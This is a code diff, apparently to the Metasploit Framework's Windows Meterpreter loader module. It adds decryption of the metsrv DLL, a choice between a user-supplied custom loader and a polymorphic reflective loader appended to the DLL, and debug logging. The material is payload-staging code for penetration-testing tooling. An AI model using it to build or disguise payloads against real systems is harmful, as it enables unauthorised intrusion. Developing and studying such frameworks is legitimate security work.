@@ -13,6 +13,7 @@ module Payload::Windows::MeterpreterLoader
 
   include Msf::ReflectiveDLLLoader
   include Msf::Payload::Windows
+  include Msf::Payload::Windows::ReflectiveLoader
 
   def initialize(info = {})
     super(update_info(info,
@@ -102,15 +103,49 @@ module Payload::Windows::MeterpreterLoader
   def stage_meterpreter(opts={})
     ds = opts[:datastore] || datastore
     debug_build = ds['MeterpreterDebugBuild']
-    # Exceptions will be thrown by the mixin if there are issues.
-    dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x86.dll', debug: debug_build))
+    loader = nil
+    dll_path = MetasploitPayloads.meterpreter_path('metsrv', 'x86.dll', debug: debug_build)
+    dll = ::MetasploitPayloads::Crypto.decrypt(ciphertext: ::File.binread(dll_path))
+    begin
+      rdi_offset = parse_pe(dll)
+    rescue
+      rdi_offset = nil
+    end
+
+    # Prefer a site-local custom loader binary if the user has dropped one into
+    # the meterpreter search paths (~/.msf4/user_data/meterpreter/ or
+    # <msf>/data/meterpreter/); otherwise assemble the polymorphic reflective
+    # loader on the fly.
+    custom_loader_path = [
+      ::MetasploitPayloads.user_meterpreter_dir,
+      ::MetasploitPayloads.msf_meterpreter_dir
+    ].map { |dir| ::File.join(dir, 'custom_loader.x86.bin') }.find { |p| ::File.readable?(p) }
+
+    use_loader = false
+    if custom_loader_path
+      dlog("Using custom loader from #{custom_loader_path}")
+      ::MetasploitPayloads.warn_local_path(custom_loader_path)
+      loader = ::File.binread(custom_loader_path)
+      use_loader = true
+    end
+
+    if rdi_offset.nil? && !use_loader
+      loader = reflective_loader(iv: datastore_reflective_loader_iv(ds))
+      use_loader = true
+    end
 
     asm_opts = {
-      rdi_offset: offset,
-      length:     dll.length,
+      rdi_offset: rdi_offset || dll.length, # the reflective loader is appended to the end of the DLL, so its offset within the payload equals the DLL length
+      length:     dll.length + (loader ? loader.length : 0), # total payload length = DLL + reflective loader
       stageless:  opts[:stageless] == true
     }
 
+    dlog("Using custom loader from #{custom_loader_path}") if custom_loader_path
+    dlog('Using polymorphic reflective loader') if !custom_loader_path && use_loader
+    dlog("Loader length: #{loader.length} bytes") if use_loader
+    dlog("DLL length: #{dll.length} bytes")
+    dlog("ReflectiveLoader offset: #{asm_opts[:rdi_offset]} bytes")
+    dlog("Configuration offset: #{asm_opts[:length]} bytes")
     asm = asm_invoke_metsrv(asm_opts)
 
     # generate the bootstrap asm
@@ -123,7 +158,7 @@ module Payload::Windows::MeterpreterLoader
 
     # patch the bootstrap code into the dll's DOS header...
     dll[ 0, bootstrap.length ] = bootstrap
-
+    dll += loader if use_loader
     dll
   end
 
